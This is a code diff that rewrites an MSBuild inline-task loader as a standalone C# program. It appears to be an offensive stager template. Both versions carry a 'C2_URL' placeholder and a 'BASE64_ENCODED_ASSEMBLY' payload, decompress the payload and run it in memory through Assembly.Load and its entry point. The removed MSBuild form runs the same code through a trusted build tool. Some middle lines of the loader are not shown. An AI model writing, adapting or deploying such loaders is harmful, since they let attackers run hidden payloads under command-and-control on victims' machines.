@@ -1,22 +1,12 @@
-<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <Target Name="NAME_GOES_HERE">
-    <NAME_GOES_HERE >
-    </NAME_GOES_HERE>
-  </Target>
-  <UsingTask
-    TaskName="NAME_GOES_HERE"
-    TaskFactory="CodeTaskFactory"
-    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
-    <ParameterGroup/>
-    <Task>
-      <Using Namespace="System" />
-      <Using Namespace="System.Reflection" />
-      <Using Namespace="System.IO" />
-      <Using Namespace="System.IO.Compression" />
+using System;
+using System.Reflection;
+using System.IO;
+using System.IO.Compression;
 
-      <Code Type="Fragment" Language="cs">
-        <![CDATA[
-
+public class CLASS_NAME
+{
+    public static void Main()
+    {
         string url = "C2_URL";
         string b64 = "BASE64_ENCODED_ASSEMBLY";
 
@@ -41,9 +31,6 @@
               Assembly a = Assembly.Load(outputStream.ToArray());
               a.EntryPoint.Invoke(null, new object[] { args });
             }
-          }
-        ]]>
-      </Code>
-    </Task>
-  </UsingTask>
-</Project>
+        }
+    }
+}
